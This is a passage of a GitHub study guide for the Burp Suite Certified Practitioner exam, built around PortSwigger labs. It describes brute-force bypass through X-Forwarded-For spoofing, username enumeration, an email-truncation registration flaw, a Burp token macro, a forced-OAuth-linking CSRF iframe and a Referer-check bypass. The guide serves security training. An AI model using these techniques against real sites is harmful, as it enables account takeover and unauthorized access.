dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking\" rel=\"nofollow\"\u003ePortSwigger Lab: Offline password cracking\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBrute Force Protected Login\u003c/h3\u003e\u003ca id=\"user-content-brute-force-protected-login\" class=\"anchor\" aria-label=\"Permalink: Brute Force Protected Login\" href=\"#brute-force-protected-login\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentified\u003c/strong\u003e\u003c/em\u003e brute force protection on login when back-end enforce 30 minute ban, resulting in \u003cstrong\u003eIP blocked\u003c/strong\u003e after too many invalid login attempts. Testing \u003ccode\u003eX-Forwarded-For:\u003c/code\u003e header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use \u003cstrong\u003ePitchfork\u003c/strong\u003e technique to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e first valid usernames with random long password and then rerun intruder with \u003cstrong\u003ePitchfork\u003c/strong\u003e, set each payload position attack iterates through all sets simultaneously.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists\"\u003eBurp Lab Username, Password and directory fuzzing Word lists\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePayload position 1 on IP address for \u003ccode\u003eX-Forwarded-For:\u003c/code\u003e and position 2 on username with a long password to see the \u003cstrong\u003eresponse time delay\u003c/strong\u003e in attack columns window.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"X-Forwarded-For: 12.13.14.15\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eX-Forwarded-For: 12.13.14.15\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/pitchfork.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/pitchfork.png\" alt=\"Intruder Pitchfork\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRepeat above \u003cstrong\u003ePitchfork\u003c/strong\u003e intruder attack on the password field and then \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e valid password from the status column with 302 result.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing\" rel=\"nofollow\"\u003ePortSwigger Lab: Username enumeration via response timing\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSubtly Invalid Login\u003c/h3\u003e\u003ca id=\"user-content-subtly-invalid-login\" class=\"anchor\" aria-label=\"Permalink: Subtly Invalid Login\" href=\"#subtly-invalid-login\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e that the login page \u0026amp; password reset is not protected by brute force attack, and no IP block or time-out enforced for invalid username or password.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTip for the BSCP Exam, there is sometimes another user with weak password that can be brute forced. Carlos is not always the account to target to give a foothold access in stage 1.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/subtly-invalid-login.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/subtly-invalid-login.png\" alt=\"Subtly invalid login\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNotice on the Intruder attack column for the GREP value, \u003ccode\u003eInvalid username or password.\u003c/code\u003e the one response message for a failed username attack do not contain full stop period at the end. Repeat the attack with this \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e username, and \u003cstrong\u003eSniper\u003c/strong\u003e attack the password field to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e \u003ccode\u003e302\u003c/code\u003e response for valid login.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/refresh-password.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/refresh-password.png\" alt=\"Refresh Password\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the BSCP exam \u003cem\u003e\u003cstrong\u003elookout\u003c/strong\u003e\u003c/em\u003e for other messages returned that are different and disclose valid accounts on the application and allow the brute force \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e of account passwords, such as example on the \u003ca href=\"#refresh-password-broken-logic\"\u003erefresh password reset\u003c/a\u003e function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOnce valid username identified from different response message, the perform \u003ca href=\"#brute-force\"\u003ebrute force\u003c/a\u003e using Burp Intruder on the password.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses\" rel=\"nofollow\"\u003ePortSwigger Lab: Username enumeration via subtly different responses\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAnother scenario to identify valid username on the WEB APP is to provide list of usernames on login and one invalid password value. In the Intruder attack results one response will contain message \u003ccode\u003eIncorrect password\u003c/code\u003e.\u003cbr\u003e\nIntruder attack injection position, \u003ccode\u003eusername=invalid-username\u0026amp;password=SomeStupidLongCrazyWrongSecretPassword123456789\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses\" rel=\"nofollow\"\u003ePortSwigger Lab: Username enumeration via different responses\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAuthentication\u003c/h2\u003e\u003ca id=\"user-content-authentication\" class=\"anchor\" aria-label=\"Permalink: Authentication\" href=\"#authentication\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#account-registration\"\u003eAccount Registration\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#auth-token-bypass-macro\"\u003eAuth Token bypass Macro\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAccount Registration\u003c/h3\u003e\u003ca id=\"user-content-account-registration\" class=\"anchor\" aria-label=\"Permalink: Account Registration\" href=\"#account-registration\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBusiness logic flaw in the account registration feature allow for gaining foothold as target user role access. \u003ca href=\"#content-discovery\"\u003eContent Discovery\u003c/a\u003e find the path \u003ccode\u003e/admin\u003c/code\u003e, message state the Admin interface is only available if logged in as a \u003cstrong\u003eDontWannaCry\u003c/strong\u003e user.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/register-length-flaw.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/register-length-flaw.png\" alt=\"Register length flaw\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCreating email with more that 200 character before the \u003ccode\u003e@\u003c/code\u003e symbol is then truncated to 255 characters. This \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the vulnerability in the account registration page logic \u003cstrong\u003eflaw\u003c/strong\u003e. In the email below the \u003ccode\u003em\u003c/code\u003e at the end of \u003ccode\u003e@dontwannacry.com\u003c/code\u003e is character 255 exactly.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-strings@dontwannacry.com.exploit-0afe007b03a34169c10b8fc501510091.exploit-server.net\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003every-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-string-so-very-long-strings@dontwannacry.com.exploit-0afe007b03a34169c10b8fc501510091.exploit-server.net\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/Inconsistent-handling-exceptional-input.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/Inconsistent-handling-exceptional-input.png\" alt=\"Inconsistent-handling-exceptional-input\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input\" rel=\"nofollow\"\u003ePortSwigger Lab: Inconsistent handling of exceptional input\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAuth Token bypass Macro\u003c/h3\u003e\u003ca id=\"user-content-auth-token-bypass-macro\" class=\"anchor\" aria-label=\"Permalink: Auth Token bypass Macro\" href=\"#auth-token-bypass-macro\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIf the authentication login is protected against brute force by using random token that is used on every login POST, a Burp Macro can be used to bypass protection.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCreate Burp Macro\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eOpen Proxy settings and select \u003cstrong\u003esessions\u003c/strong\u003e under Project choices.\u003c/li\u003e\n\u003cli\u003eScroll down to \u003ccode\u003eMacros\u003c/code\u003e, and add new macro.\u003c/li\u003e\n\u003cli\u003eSelect \u003cstrong\u003erequest\u003c/strong\u003e from the list to use for the value to be used.\u003c/li\u003e\n\u003cli\u003eclick \u003ccode\u003eConfigure item\u003c/code\u003e and add custom parameter location to extract.\u003c/li\u003e\n\u003cli\u003eClick \u003cstrong\u003eOK\u003c/strong\u003e to return to Sessions under Project choices.\u003c/li\u003e\n\u003cli\u003eAdd a Session handling \u003cstrong\u003erule\u003c/strong\u003e, and the editor dialogue opens.\u003c/li\u003e\n\u003cli\u003eIn the dialogue, go to the \"Scope\" tab.\u003c/li\u003e\n\u003cli\u003eUnder scope for the session handling rule editor, \u003cstrong\u003echeck\u003c/strong\u003e Target, Intruder, and Repeater.\u003c/li\u003e\n\u003cli\u003eStill under \"URL Scope\", select \u003ccode\u003eInclude all URLs\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eClose Settings.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/create-macro.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/create-macro.png\" alt=\"How To Create a Macro in Burp Suite Professional\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money\" rel=\"nofollow\"\u003ePortSwigger Lab: Infinite money logic flaw - show how to create Burp Macro\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePrivilege Escalation\u003c/h1\u003e\u003ca id=\"user-content-privilege-escalation\" class=\"anchor\" aria-label=\"Permalink: Privilege Escalation\" href=\"#privilege-escalation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCSRF Account Takeover\u003c/h2\u003e\u003ca id=\"user-content-csrf-account-takeover\" class=\"anchor\" aria-label=\"Permalink: CSRF Account Takeover\" href=\"#csrf-account-takeover\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#oauth\"\u003eOAuth\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#referer-validation-csrf\"\u003eReferer Validation CSRF\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#referer-header-present\"\u003eReferer Header Present\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#lastsearchterm\"\u003eLastSearchTerm\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#csrf-duplicated-in-cookie\"\u003eCSRF duplicated in cookie\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#csrf-token-present\"\u003eCSRF Token Present\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#is-logged-in\"\u003eIs Logged In\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#csrf-no-defences\"\u003eCSRF No Defences\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#samesite-strict-bypass\"\u003eSameSite Strict bypass\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#samesite-lax-bypass\"\u003eSameSite Lax bypass\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eOAuth\u003c/h3\u003e\u003ca id=\"user-content-oauth\" class=\"anchor\" aria-label=\"Permalink: OAuth\" href=\"#oauth\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eoAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf.png\" alt=\"csrf\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIntercepted the GET /oauth-linking?code=[...]. send to repeat to save code. \u003cstrong\u003eDrop\u003c/strong\u003e the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the \u003ccode\u003esrc\u003c/code\u003e attribute points to the URL you just copied.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/oauth-linking?code=STOLEN-CODE\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/oauth-linking?code=STOLEN-CODE\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking\" rel=\"nofollow\"\u003ePortSwigger Lab: Forced OAuth profile linking\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eReferer Validation CSRF\u003c/h3\u003e\u003ca id=\"user-content-referer-validation-csrf\" class=\"anchor\" aria-label=\"Permalink: Referer Validation CSRF\" href=\"#referer-validation-csrf\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the change email function is vulnerable to CSRF by observing when the \u003cstrong\u003eReferer\u003c/strong\u003e header value is changed the response give message, \u003ccode\u003eInvalid referer header\u003c/code\u003e, and the email change is accepted when the referrer value contains the expected target domain somewhere in the value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-csrf-referer-header-check.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-csrf-referer-header-check.png\" alt=\"identify csrf referer header check\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdding original domain of target and append \u003ccode\u003ehistory.pushState('', '', '/?TARGET.net');\u003c/code\u003e to the \u003cstrong\u003eReferer header\u003c/strong\u003e in the form of a query string, allow the change email to update.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"Referrer-Policy: unsafe-url\"\u003e\u003cpre\u003eReferrer-Policy: unsafe-url\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e Unlike the normal Referer header spelling, the word 